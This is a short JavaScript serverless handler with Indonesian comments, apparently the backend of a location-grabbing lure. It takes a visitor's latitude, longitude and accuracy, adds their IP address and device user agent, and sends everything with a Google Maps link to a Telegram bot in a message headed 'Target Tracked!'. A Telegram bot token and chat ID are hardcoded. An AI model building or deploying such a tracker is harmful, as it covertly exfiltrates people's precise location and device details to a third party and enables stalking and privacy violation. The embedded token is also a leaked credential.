export default async function handler(req, res) {
    // 1. Konfigurasi Telegram (GANTI INI)
    const BOT_TOKEN = "8225221172:AAGVY6PZeDruIazy9prg3Z1JXtI_GdxAPGA"; 
    const CHAT_ID = "7755675050"; // Ganti dengan ID Chat Anda

    // Hanya terima metode POST
    if (req.method !== 'POST') {
        return res.status(405).json({ message: 'Method Not Allowed' });
    }

    const { latitude, longitude, accuracy } = req.body;
    
    // Ambil info User Agent (Perangkat) & IP
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    // 2. Buat Pesan
    const mapLink = `https://www.google.com/maps/place/${latitude},${longitude}`;
    const message = `
📍 *Target Terlacak!*
-----------------------
🌐 IP: \`${ip}\`
📱 Device: ${userAgent}
🎯 Akurasi: ${accuracy} meter
🌍 Maps: [Klik Disini](${mapLink})
    `;

    // 3. Kirim ke Telegram via Fetch
    const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    
    try {
        await fetch(telegramUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });
        return res.status(200).json({ status: 'Sukses' });
    } catch (error) {
        return res.status(500).json({ status: 'Gagal kirim ke Telegram' });
    }
}
